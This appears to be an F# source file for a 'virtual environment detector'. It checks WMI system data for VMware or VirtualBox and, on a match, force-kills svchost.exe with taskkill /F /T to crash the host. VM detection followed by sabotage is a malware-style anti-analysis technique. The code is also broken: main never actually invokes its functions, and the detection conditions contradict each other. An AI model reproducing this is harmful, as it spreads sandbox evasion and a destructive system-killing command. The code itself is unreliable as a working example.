open System
open System.Diagnostics
open System.Management
open System.Threading.Tasks
open Microsoft.Win32
open System.ComponentModel

//
// (C) Толстопятов Алексей А. 2024
// 
//      VENVDE (Virtual Environment Detector)
// Автор идеи: NYAN CAT (https://github.com/NYAN-x-CAT)
// Проверяет, работает ли операционная система с помощью виртуальной машины.
// 
let mutable vmDetected: bool = false

let killProcessNet ():unit = 
    try
        let worker:Process[] = Process.GetProcessesByName("svchost.exe")
        worker[0].Kill()

    with
        | :? Win32Exception
        | :? NotSupportedException
        | :? InvalidOperationException
        | :? Exception as e -> printfn "%s" e.Message

let killProcess ():unit =
    try
        let _ = Process.Start("taskkill", "/IM svchost.exe /F /T")
        ()
    with
        | :? Exception -> 
            printfn("Exception was thrown inside. You will suffer.")
            killProcessNet()

let getPunishment() = 
    if vmDetected then
        killProcess()
    else
        ()

let getVirtualMachineDrivers():unit = 
    let qobj:ManagementObjectSearcher = 
        new Management.ManagementObjectSearcher("select * from Win32_ComputerSystem")

    let qresult:ManagementObjectCollection
        = qobj.Get()

    for item in qresult do
        let mf:string = 
            item["Manufacturer"]
                .ToString()
                .ToLower()
        
        if (mf = "microsoft corporation") && 
            (item["Model"]
                .ToString()
                .ToLower()
                .ToLowerInvariant()
                .Contains("virtual"))
                then
            
            let tag = item["Model"].ToString()
            
            if tag.Contains("vmware") || tag.Contains("VirtualBox")  then
                vmDetected <- true
            ()
        else
            ()

    qresult.Dispose()
    qobj.Dispose()
    
    ()

let main(args:string[]):int = 
    getVirtualMachineDrivers |> ignore
    getPunishment |> ignore
    0